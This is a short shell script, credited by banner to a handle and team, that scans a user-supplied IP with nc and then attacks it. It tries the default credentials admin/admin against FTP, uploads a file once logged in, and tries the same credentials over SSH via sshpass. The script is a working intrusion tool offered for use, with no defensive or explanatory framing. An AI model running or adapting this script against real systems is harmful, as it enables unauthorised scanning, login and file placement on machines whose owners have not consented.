#!/bin/sh


# banner


echo '           XX                                    XX'
echo '         XX..X                                  X..XX'
echo '       XX.....X                                X.....XX'
echo '  XXXXX.....XX                                  XX.....XXXXX'
echo ' X |......XX%,.@                              @#%,XX......| X'
echo ' X |.....X  @#%,.@                          @#%,.@  X.....| X'
echo ' X  \...X     @#%,.@                      @#%,.@     X.../  X'
echo '  X# \.X        @#%,.@                  @#%,.@        X./  #'
echo '   ##  X          @#%,.@              @#%,.@          X   #'
echo ' , "# #X            @#%,.@          @#%,.@            X ##'
echo '    `###X             @#%,.@      @#%,.@             ####'
echo '   .   ###              @#%.,@  @#%,.@              ###`" '
echo '     . ";"                @#%.@#%,.@                ;"` '
echo '                            @#%,.@                   '
echo '        ` ,                @#%,.@  @@                `'
echo '                           @@@  @@@ '
echo ''
echo ''
echo '             make by ---> @d_5tr '
echo '             Team ---> @zer0one_01 '

echo ''
echo ''
echo ''
# IP target
read -p '[+] Enter IP :' HOST

read -p '[+] Enter many port you want scan :' PORT

echo "Start scaning ..."
# use nc for scan
nc -nvz $HOST 1-$PORT > scan_d5tr.txt 2>&1
#  tac - concatenate and print files in reverse
tac scan_d5tr.txt
# delet the file
rm scan_d5tr.txt


echo 'Trying USER : admin | PASSWORD : admin'
echo 'Try login FTP ...'

# user and password
USER='admin'
PASSWD='admin'
FILE='file.txt'

# login
ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
put $FILE
quit
END_SCRIPT

echo 'Trying USER : admin | PASSWORD : admin'
echo 'Try login ssh ...'

# log in ssh
sshpass -p "$PASSWD" ssh admin@$HOST


